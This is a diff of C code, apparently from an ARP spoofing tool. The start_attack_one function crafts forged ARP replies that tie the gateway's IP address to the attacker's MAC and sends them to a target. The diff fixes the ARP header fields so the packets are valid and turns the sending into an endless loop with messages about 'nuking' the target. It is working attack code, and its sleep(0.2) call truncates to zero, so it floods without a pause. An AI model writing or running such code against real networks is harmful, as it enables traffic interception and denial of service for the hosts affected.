@@ -37,7 +37,6 @@ err:
 	return(-1);	
 }
 
-
 int start_attack_one(const struct arguments *arguments, nmap_r *target)
 {
 	unsigned char payload[42] = { 0x0 };
@@ -50,12 +49,13 @@ int start_attack_one(const struct arguments *arguments, nmap_r *target)
 
 	if ((iface = initiate_socket_for_arp(arguments->ifacename)) == -1)
 		goto err;
+	TELLSOCKETSUCCESS(arguments->ifacename);
 
 	copy_mac(eth_hdr->dest_addr, target->ha);	/* 6 bytes dest addr */
 	copy_mac(eth_hdr->src_addr, arguments->self_ha);	/* 6 bytes src addr (us) */
 	eth_hdr->eth_type = htons(ETH_P_ARP);	/* arp request htons(0x0806) */
-	arp_hdr->htype = 0x1;	/* hardware type htons(0x1) */ // not sure about this
-	arp_hdr->ptype = htons(ETH_P_ARP);	/* protocol type htons(0x0806) */ // nor this
+	arp_hdr->htype = htons(0x1);	/* hardware type htons(0x1) */ // not sure about this
+	arp_hdr->ptype = htons(0x0800);	/* protocol type htons(0x0800) */ // nor this
 	arp_hdr->hlen = ETH_ALEN; /* hardware addr len 6 */
 	arp_hdr->plen = IPV4_LEN; /* proto addr len 4 */
 	arp_hdr->operation = htons(0x2);	/* response arp type */
@@ -73,14 +73,14 @@ int start_attack_one(const struct arguments *arguments, nmap_r *target)
 	ifaceinfo.sll_addr[6] = 0x00;
 	ifaceinfo.sll_addr[7] = 0x00;
 
-	// while (g_stop != 1) {
-
+	TELLNUKINGTARGET(target->pa, arguments->gateway_pa, arguments->self_ha);
+	while (1) {
 		rlen = sendto(iface, payload, ETH_HLEN + ARP_HLEN, 0, (struct sockaddr*)&ifaceinfo, sizeof(ifaceinfo));
 
 		if (rlen != ETH_HLEN + ARP_HLEN)
 			{ ERROR_SEND(); goto err; }
-
-	// }
+		sleep(0.2); // need to match ppm in arg structure
+	}
 
 	close(iface);
 	return 0;
